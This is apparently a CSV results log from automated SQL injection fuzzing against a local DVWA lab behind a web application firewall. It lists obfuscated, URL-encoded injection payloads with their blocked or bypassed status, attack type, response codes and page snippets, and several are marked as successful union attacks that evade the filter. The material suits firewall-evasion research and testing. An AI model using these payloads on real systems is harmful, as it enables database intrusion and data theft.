Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=.1+or%0bnot%0b{`if`%0b1}=1=%0b(not+{x%0b(select%0b1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0278,69.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor%0bnot+{`if`+1}=1=+(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0284,70.17,No,500,
0'<@=1.+||+not+{a+1}=1=%0b(!~false)+||%27,Bypassed,No,None,Unknown,0.0239,70.17,No,500,
0%27<@=1.+or+!+{a%0b1}=1=+(!+{x+(select+1)}=1)+,Blocked,No,None,Unknown,0.0317,70.17,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0bor+not%0btrue=+(0)%0b||%27,Bypassed,No,None,booleanAtk,0.0107,70.17,No,500,
0%27<@=1.+||%0b!%0b{x+(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1,Blocked,No,None,Unknown,0.0119,70.17,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+not%0b1=%0b(false)%0bor',Bypassed,No,None,booleanAtk,0.0288,70.17,No,500,
0%27<@=1+||+!~false=+(not+{`if`+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0415,70.38,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or%0bnot%0btrue=%0b(not+{x+(select+1)}=1)+||',Bypassed,No,None,booleanAtk,0.022,70.59,No,500,
0'<@!=1.+||+!%7e0=+(!+1)+or%27,Blocked,No,None,Unknown,0.0129,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+or+not+{x%0b(select+1)}=1=%0b(not+1)+or',Bypassed,No,None,Unknown,0.031,70.59,No,500,
0'<@!=1.%0bor%0b!+{x+(select+1)}=1=%0b(not%0b{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0214,70.59,No,500,
0%27<@!=.1%0b||+0=+(!%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0232,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0b!%0b{`if`%0b1}=1=%0b(not+{`if`%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0191,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+0=%0b(!+{`if`+1}=1)+||%27,Bypassed,No,None,Unknown,0.0211,70.59,No,500,
0%27<@=1.+||%0b!+{`if`%0b1}=1=+(not+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0209,70.59,No,500,
0%27<@=1%0b||+not~0=+(!+{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0317,70.59,No,500,
